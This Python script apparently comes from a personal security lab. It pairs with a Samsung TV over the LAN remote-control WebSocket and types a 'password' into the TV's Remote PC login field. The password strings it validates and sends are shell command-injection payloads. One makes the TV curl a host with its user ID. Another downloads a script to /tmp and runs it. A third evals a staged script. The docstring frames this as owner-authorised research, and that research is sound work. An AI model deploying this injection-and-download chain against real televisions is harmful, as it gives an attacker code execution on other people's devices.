"""Type a validated DansTV lab password through Samsung's LAN remote-input API.

Uses the owner-authorised Samsung remote WebSocket (WSS port 8002) and
only sends text to the field the user explicitly focused. It does not
press Enter, navigate the TV, launch apps or run an exploit by itself.

Dependency: py -m pip install websocket-client
"""
from __future__ import annotations
import argparse
import base64
import json
from pathlib import Path
import re
import ssl
import sys
import time
from urllib.parse import urlencode

ROOT = Path(__file__).resolve().parents[2]
LAB = ROOT / ".local" / "tiz0wn-lab"
TV_FILE = ROOT / ".local" / "device.json"
TOKEN_FILE = LAB / "tv-remote-token.txt"
ENV_FILE = LAB / "lab.env"
BACKUP_FILE = LAB / "lab.env.before-uid"


def prepared_password(lab: Path) -> str:
    """Accept only a trigger produced by one active, locally prepared trial."""
    entries = [line.removeprefix("TVPROBE_PASSWORD=") for line in
               (lab / "lab.env").read_text(encoding="ascii").splitlines()
               if line.startswith("TVPROBE_PASSWORD=")]
    if len(entries) != 1:
        raise ValueError("Expected one lab password")
    secret = entries[0]
    uid_active = (lab / "lab.env.before-uid").is_file()
    snapshot_active = (lab / "lab.env.before-snapshot").is_file()
    if uid_active == snapshot_active:
        raise ValueError("Prepare exactly one trial before sending")
    if uid_active:
        if not re.fullmatch(r"\$\(/usr/bin/curl\$\{IFS\}http://192\.168\.50\.\d+:8181/\$EUID\)", secret):
            raise ValueError("Current lab password is not the prepared UID probe")
    else:
        session = json.loads((lab / "snapshot-session.json").read_text(encoding="ascii"))
        owner = json.loads((lab / "ownership.json").read_text(encoding="utf-8-sig"))
        token = session.get("token", "")
        if (session.get("host") != owner.get("pc") or session.get("tv") != owner.get("tv")
                or owner.get("user") != "danstvprobe" or owner.get("share") != "DansTVProbe"
                or not re.fullmatch(r"[0-9a-f]{24}", token)):
            raise ValueError("Unexpected snapshot session")
        if session.get("mode") == "Staged":
            remote = session.get("stage_remote", "")
            if not re.fullmatch(r"/home/owner/share/tmp/sdk_tools/dtvs[0-9a-f]{8}\.sh", remote) or \
                    not remote.endswith("dtvs" + token[:8] + ".sh"):
                raise ValueError("Invalid staged TV path")
            expected = '$(eval${IFS}$(cat${IFS}' + remote + '))'
        else:
            tmp = "/tmp/dtv" + token[:6]
            expected = ('$(/usr/bin/curl${IFS}-fsS${IFS}http://' + session["host"] +
                        ':8181/d/' + token + '>' + tmp + '&&.${IFS}' + tmp + ')')
        if secret != expected:
            raise ValueError("Current password does not match the snapshot session")
    return secret



def normal_password(lab: Path) -> str:
    """Read only the original generated lab credential after full trial restore."""
    if any((lab / marker).exists() for marker in (
            "lab.env.before-uid", "lab.env.before-snapshot", "snapshot-session.json")):
        raise ValueError("A diagnostic trial may still be active; restore it first")
    owner = json.loads((lab / "ownership.json").read_text(encoding="utf-8-sig"))
    if owner.get("user") != "danstvprobe" or owner.get("share") != "DansTVProbe":
        raise ValueError("Unexpected lab ownership")
    entries = [line.removeprefix("TVPROBE_PASSWORD=") for line in
               (lab / "lab.env").read_text(encoding="ascii").splitlines()
               if line.startswith("TVPROBE_PASSWORD=")]
    # rdp-lab.ps1 Setup generates 'TvA9' followed by six hex bytes.
    # Never relay a command-substitution probe or an unknown replacement.
    if len(entries) != 1 or not re.fullmatch(r"TvA9[0-9A-F]{12}", entries[0]):
        raise ValueError("Not a restored, ordinary generated lab password")
    return entries[0]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("pair", "send", "send-normal"))
    args = parser.parse_args()
    if not TV_FILE.is_file():
        raise SystemExit("Missing .local/device.json (Q80T target).")
    host = json.loads(TV_FILE.read_text(encoding="utf-8")).get("host")
    if host != "192.168.50.169":
        raise SystemExit("Unexpected target TV; check the current Q80T IP first.")
    if args.action in ("send", "send-normal"):
        try:
            secret = prepared_password(LAB) if args.action == "send" else normal_password(LAB)
        except (OSError, ValueError, KeyError):
            raise SystemExit("Requested password is not valid for the current lab state; refusing to send.") from None
    else:
        secret = None
    try:
        import websocket
    except ImportError:
        raise SystemExit("Install dependency once: py -m pip install websocket-client") from None
    token = TOKEN_FILE.read_text(encoding="ascii").strip() if TOKEN_FILE.exists() else ""
    name = base64.b64encode(b"DansTV Test Keyboard").decode("ascii")
    query = urlencode({"name": name, **({"token": token} if token else {})})
    url = f"wss://{host}:8002/api/v2/channels/samsung.remote.control?{query}"
    print("Connecting to Samsung TV's local remote-input channel.")
    if not token:
        print("On the TV, approve the 'DansTV Test Keyboard' remote-control request.")
    # Self-signed Samsung TV TLS certificate; exception is scoped to this
    # one RFC1918 host and socket, never process-wide.
    try:
        ws = websocket.create_connection(
            url, timeout=35,
            sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False},
        )
    except Exception as exc:
        raise SystemExit(f"Could not open Samsung remote channel: {exc}") from None
    try:
        accepted = False
        end = time.monotonic() + 35
        while time.monotonic() < end:
            try:
                event = json.loads(ws.recv())
            except Exception as exc:
                raise SystemExit(f"Samsung pairing did not complete: {exc}") from None
            if event.get("event") == "ms.channel.connect":
                new_token = event.get("data", {}).get("token")
                if new_token and re.fullmatch(r"[A-Za-z0-9_-]{1,128}", str(new_token)):
                    LAB.mkdir(parents=True, exist_ok=True)
                    TOKEN_FILE.write_text(str(new_token), encoding="ascii")
                accepted = True
                break
            if event.get("event") in ("ms.channel.unauthorized", "ms.error"):
                raise SystemExit("Samsung denied the remote input request.")
        if not accepted:
            raise SystemExit("No Samsung remote-control approval received.")
        if args.action == "pair":
            print("Paired. On TV focus the Remote PC PASSWORD box, then run send or send-normal.")
            return 0
        assert secret is not None
        print("Sending text to the currently focused TV input (without pressing Enter)...")
        ws.send(json.dumps({
            "method": "ms.channel.emit",
            "params": {"event": "custom.remote.textReceived", "to": "broadcast"},
        }))
        ws.send(json.dumps({
            "method": "ms.remote.control",
            "params": {
                "Cmd": base64.b64encode(secret.encode("utf-8")).decode("ascii"),
                "DataOfCmd": "base64",
                "TypeOfRemote": "SendInputString",
            },
        }))
        time.sleep(1)
        print("Text command sent. Confirm the TV password field accepted it before connecting.")
        print("Some Samsung password fields reject external IME text; this cannot verify acceptance.")
        return 0
    finally:
        ws.close()


if __name__ == "__main__":
    sys.exit(main())
